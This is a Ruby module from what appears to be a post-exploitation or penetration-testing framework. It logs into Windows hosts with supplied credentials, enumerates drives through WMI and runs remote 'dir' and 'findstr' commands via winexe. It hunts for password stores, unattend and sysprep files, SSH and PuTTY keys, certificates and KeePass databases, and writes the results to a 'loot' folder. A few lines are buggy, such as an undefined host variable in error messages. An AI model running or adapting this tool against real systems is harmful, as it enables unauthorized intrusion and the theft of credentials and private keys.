require 'poet'

# formats and extensions
# ie: %OFFICE%, %PASSWORD%


class Filefind < Poet::Scanner
	self.mod_name = "File Finder"
	self.description = "Locate sensitive files on target(s)."
	
	# formats and extensions 
	# ie: %OFFICE%, %PASSWORD%, %KEYFILES%  
	OFFICE_EXT = "*.xls, *.csv, *.doc, *.docx, *.pdf"
	PASSWORD_EXT = "accounts.xml, unattend.xml, unattend.txt, sysprep.xml, *.passwd, passwd, shadow, passwd~, shadow~, passwd-, shadow-, tomcat-users.xml, RazerLoginData.xml, ultravnc.ini, profiles.xml, spark.properties, steam.vdf, WinSCP.ini, accounts.ini, ws_ftp.ini, svn.simple, config.dyndns, FileZilla.Server.xml"
	KEYFILES_EXT = "*.kbdx, *.ppk, *id_rsa*, *.pem, *.crt, *.key"
	CONFIG_EXT = "*.cfg, *.inf, *.ini, *.config, *.conf, *.setup, config.*, *.cnf, pref*.xml, *.preferences, *.properties"
	BATCH_EXT = "*.bat, *.sh, *.ps, *.ps1, *.vbs, *.run"
	MAIL_EXT = "*.pst, *.mbox, *.spool"
	VM_EXT = "*.vmem, *.ova, *.vmdk, *.snapshot, *.vdi"
	DB_EXT = "*.sql, *.db"
	
	@snapshot = false
	
	def setup
		# Print title
		puts 

		@timeout = 0
		
		# Get valid path
		print "Enter path to file or list of items or look for #{color_banner('[unattend.txt, unattend.xml, sysprep.*]')} :"
		ext = rgets
		if ext.empty?
			ext = "unattend.txt, unattend.xml, sysprep.*"
		elsif File.file? ext
			temp = []
			File.open(ext, "r").each_line {|line| temp << line}
			print_good("File #{ext} parsed, #{temp.length} items found")
			ext = temp.join(',')
			puts
		end
		until @snapshot =~ /^(y|n)$/
			print "Would you like to save a snapshot list of the file system (likely huge)? [#{color_banner('y')}|#{color_banner('n')}]"
			@snapshot = rgets.downcase
		end
		@snapshot = @snapshot.eql? 'y'
		
		# TODO: make C:\\derp a randomized filename
		# Perhaps make a check for TEMP files that are writeable - do a write check and confirm.
		@command = ''
		@command << '&& dir /s /b > C:\\derp'
		ext.split(',').each {|file| @command << " && findstr #{file.strip} C:\\derp"}
		# ext.split(',').each {|file| @command << "
		create_folder("#{@log}/loot") unless folder_exists("#{@log}/loot")
		create_folder("#{@log}/loot/filefinder") unless folder_exists("#{@log}/loot/filefinder")
	
		puts
		title = "File Finder"
		puts color_header(title)
	end

	def run(username, password, host)
		smboptions = "//#{host}"
		files_found = ''
		all_files = ''
		drives = []		
	
		wmic = smbwmic(smboptions, "select Description,DeviceID from Win32_logicaldisk")
		wmic.lines.each do |line|
			next if line =~ /Description|DeviceID/ or not line.include? '|'
			split_line = line.split('|')
			next if split_line[0] =~ /(CD-ROM|Floppy)/
			drives << split_line[1].strip
		end

		# For each drive detected, run the search
		drives.each do |drive|
			# If final one, add uninstall to winexe
			smboptions = "--uninstall #{smboptions}" if drive.eql? drives.last
			find = winexe(smboptions, "CMD /C cd #{drive}\\#{@command}")
			# Continue on if nothing found
			next if find =~ /File Not Found/
			# Pull full list for later should we want it sans anything in the C:\windows dir (waste)?
			files_found << find

			if @snapshot
				all_files = winexe(smboptions, "CMD /C type C:\\derp && del C:\\derp")
			end
		end

		if files_found.empty? 
			print_bad("#{host.ljust(15)} - File(s) not found")
		else
			if files_found.lines.count > 2
				print_good("#{host.ljust(15)} - #{files_found.lines.count} File(s) found")
			else
				files_print = Array.new
				files_found.each_line {|line| files_print << line.split('\\').last.chomp}
				print_good("#{host.ljust(15)} - #{files_print.join(', ')} found")
			end
			@success += files_found.lines.count

			begin
				File.open("#{@log}/loot/filefinder/#{host}_filelist.txt", 'a') { |file| file.write(files_found) }
			rescue
				print_bad("#{Chost}: Issues Writing to #{@log}")
			end
		end

		if @snapshot
			if all_files.empty?
				print_bad("#{host.ljust(15)} - No files founnd at all on target system??")
			else
				if all_files.lines.count > 2
					print_good("#{host.ljust(15)} - #{files_found.lines.count} File(s) on system in total")
				else
					files_print = Array.new
					all_files.each_line {|line| files_print << line.split('\\').last.chomp}
					print_good("#{host.ljust(15)} - #{files_print.join(', ')} found")
				end
				@success += all_files.lines.count
				
				begin
					File.open("#{@log}/loot/filefinder/#{host}_allfiles.txt", 'a') { |file2| file2.write(all_files) }
				rescue
					print_bad("#{Chost}: Issues Writing to #{@log}")
				end
			end
		end
	end

	def finish
		# Put ending titles
		puts
		puts "Total files found: #{@success}"
		puts "File lists are located in: #{@log}/loot/filefinder/<host>_filelist.txt"

		if @snapshot
			puts "Full filesystem snapshot located in: #{@log}/loot/filefinder/<host>_allfiles.txt"
		end
		puts

		# Return to menu
		print "Press enter to Return to Enumeration Menu"
		gets

		# Save to Menu class
		#Menu.update_banner(color_banner("DA found: #{@success}"), :shares)
		#Menu.opts[:shares] = @shares
	end
end
